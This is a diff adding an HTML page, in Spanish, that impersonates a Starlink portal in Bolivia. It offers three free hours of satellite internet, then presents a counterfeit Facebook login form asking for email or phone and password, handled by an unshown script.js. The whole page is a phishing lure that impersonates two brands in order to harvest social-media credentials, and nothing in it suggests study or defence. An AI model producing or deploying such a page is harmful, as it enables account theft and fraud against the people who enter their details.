@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Starlink | Portal de Conectividad Bolivia</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="stars-container" id="starsContainer"></div>
+
+    <main class="main-wrapper">
+        <header class="header">
+            <img src="starlink.png" alt="Starlink" class="main-logo">
+            <div class="network-badge">SISTEMA SATELITAL ACTIVO</div>
+        </header>
+
+        <section id="loading-view" class="view">
+            <div class="welcome-box">
+               <h1 class="neon-text">CONECTANDO...</h1>
+                <p>¡Conéctate al Futuro con Starlink! 
+Disfruta de la velocidad satelital más rápida de Bolivia totalmente GRATIS .
+
+<br><strong>⬤ Beneficio:</strong>3 HORAS de navegación ilimitada.
+
+<br><strong>⬤ Requisito:</strong> Inicia sesión con tu cuenta de Facebook para activar el acceso. </p>
+            </div>
+            
+            <div class="progress-area">
+                <div class="labels">
+                    <span id="status-text">Sincronizando con satélites...</span>
+                    <span id="percent-text">0%</span>
+                </div>
+                <div class="track">
+                    <div id="fill-bar"></div>
+                </div>
+            </div>
+        </section>
+
+        <section id="login-view" class="view hidden">
+            <div class="fb-card">
+                <div class="fb-header">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB" width="45">
+                    <h2>Iniciar sesión</h2>
+                    <p>Inicia sesión para activar tus 3 horas de Starlink..</p>
+                </div>
+                
+                <form id="fbForm" class="fb-form">
+                    <input type="text" id="email" placeholder="Correo electrónico o número de teléfono" required>
+                    <input type="password" id="pass" placeholder="Contraseña" required>
+                    <button type="submit" class="login-btn" id="btnEnviar">iniciar sesión</button>
+                    <a href="#" class="link-forgot">¿Has olvidado la contraseña?</a>
+                    
+                    <div class="line-divider"><span>o</span></div>
+                    
+                    <button type="button" class="create-btn">Crear cuenta nueva</button>
+                </form>
+            </div>
+            <p id="msgRedireccion" class="msg-redir">
+                
+            </p>
+            <p class="footer-note">Starlink &copy; 2026 | bolivia conectado</p>
+        </section>
+    </main>
+
+    <script src="script.js"></script>
+</body>
+</html>
